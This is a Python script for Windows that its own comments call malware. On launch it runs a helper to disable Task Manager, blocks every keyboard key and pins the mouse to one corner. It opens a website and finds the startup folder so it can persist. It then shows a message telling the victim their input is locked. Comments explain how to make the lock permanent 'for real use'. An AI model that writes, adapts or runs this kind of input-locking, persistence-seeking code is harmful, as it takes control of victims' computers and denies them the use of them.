# this will make it impossible to shut the malware down unless you access the file
# through a dual boot setup (with linux 👌❤) and delete the file.

import threading
import pyautogui
import time
import keyboard
import win32clipboard
from pynput.mouse import Controller
from termcolor import colored
import webbrowser
import subprocess

subprocess.Popen("noTaskMgr.exe")

#  definitions
def blockinput():
    global block_input_flag
    block_input_flag = 1
    t1 = threading.Thread(target=blockinput_start)
    t1.start()
    print(colored('[OK] ', 'cyan') + colored('INPUT BLOCKING INSTRUCTED', 'green'))


def unblockinput():
    blockinput_stop()
    print(colored('[OK] ', 'cyan') + colored('INPUT UNBLOCKING INSTRUCTED', 'red'))


def blockinput_start():
    mouse = Controller()
    global block_input_flag
    pyautogui.FAILSAFE = False
    for i in range(150):
        keyboard.block_key(i)
    while block_input_flag == 1:
        mouse.position = (0, 0)


def blockinput_stop():
    global block_input_flag
    for i in range(150):
        keyboard.unblock_key(i)
    block_input_flag = 0


blockinput()
print(colored('[OK] ', 'yellow') + colored('INPUT BLOCKING STARTED', 'green'))

# Open Microsoft Edge
pyautogui.press("win")
time.sleep(1)
pyautogui.write("cmd")
pyautogui.press("enter")
time.sleep(0.25)

webbrowser.open('http://sighclone.tech/', new=1)

'''
print(colored('[OK] ', 'cyan') + colored('URL INPUT COMPLETED', 'green'))
time.sleep(1)
pyautogui.keyDown("alt")
pyautogui.keyDown("tab")
pyautogui.keyUp("alt")
pyautogui.keyUp("tab")
window = pyautogui.getActiveWindow()
window.close()
'''

pyautogui.keyDown("win")
pyautogui.keyDown("r")
time.sleep(0.1)
pyautogui.keyUp("r")
pyautogui.keyUp("win")
pyautogui.write("shell:startup")
pyautogui.press("enter")
# Comment the following code for real use, this ensures that keyboard and mouse stay blocked
# unblockinput()
# print(colored('[OK] ', 'yellow') + colored('INPUT BLOCKING STOPPED', 'red'))

x = 0
for x in range(0, 5):
    pyautogui.press("tab")
    time.sleep(0.5)
pyautogui.press("enter")
pyautogui.hotkey('ctrl', 'c')
win32clipboard.OpenClipboard()
startupPath = win32clipboard.GetClipboardData()
win32clipboard.CloseClipboard()

# Uncomment the following line of code to add the program to the windows startup list:
# copyfile(str(__file__), startupPath)

pyautogui.press("win")
time.sleep(1)
pyautogui.write("Notepad ")
pyautogui.press("enter")
time.sleep(0.25)
window = pyautogui.getActiveWindow()
window.maximize()
pyautogui.write("Hello! Your keyboard and mouse are locked."
                "\nYou can long press the power button to force shut your system."
                "\n\nDo <whatever> to reset")
pyautogui.keyUp("alt")
time.sleep(1)
pyautogui.keyUp("alt")
window = pyautogui.getActiveWindow()
window.close()
pyautogui.press("right")
pyautogui.press("enter")

# uncomment the following (2 lines) code for final use, doing this will block keyboard and mouse input
# unblockinput()
# print(colored('[OK] ', 'yellow') + colored('INPUT BLOCKING STOPPED', 'red'))
